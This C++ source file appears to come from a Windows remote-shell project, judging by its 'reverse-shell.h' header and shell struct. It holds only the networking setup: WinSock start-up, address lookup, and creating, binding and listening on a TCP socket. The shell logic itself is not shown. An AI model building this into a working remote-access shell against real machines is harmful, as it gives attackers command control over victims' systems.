#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>

#include "reverse-shell.h"


extern reverseShell_t	shell;
extern BOOL				g_stopProcess;
extern volatile LONG	g_stopRoutines;

static BYTE getAddr(void) {
	shell.addrHints.ai_flags = AI_PASSIVE;
	shell.addrHints.ai_family = AF_INET;
	shell.addrHints.ai_socktype = SOCK_STREAM;
	shell.addrHints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(HOSTNAME, PORT, &shell.addrHints, &shell.addrResult))
		return (FAILURE);
	return (SUCCESS);
}

static BYTE initWinSockDll(void) {
	WSADATA wsaData = {};

	if (WSAStartup(MAKEWORD(2,2), &wsaData))
		return (FAILURE);
	return (SUCCESS);
}

static BYTE createListenSocket(void) {
	if (getAddr() == FAILURE)
		return (FAILURE);
	
	shell.listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (shell.listenSocket == INVALID_SOCKET)
		return (FAILURE);
	setSocketNonBlock(&shell.listenSocket);
	return (SUCCESS);
}

static BYTE bindSocket(void) {
	if (bind(
			shell.listenSocket,
			shell.addrResult->ai_addr,
			(int)shell.addrResult->ai_addrlen
			) == SOCKET_ERROR
		) {
			return (FAILURE);
		}
	return (SUCCESS);
}

static BYTE listenSocket(void) {
	if (listen(shell.listenSocket, 1))
		return (FAILURE);
	return (SUCCESS);
}

BYTE initNetworking(void) {
	if (initWinSockDll() == FAILURE) return (FAILURE);

	if (createListenSocket() == FAILURE) return (FAILURE);

	if (bindSocket() == FAILURE) return (FAILURE);

	if (listenSocket() == FAILURE) return (FAILURE);

	return (SUCCESS);
}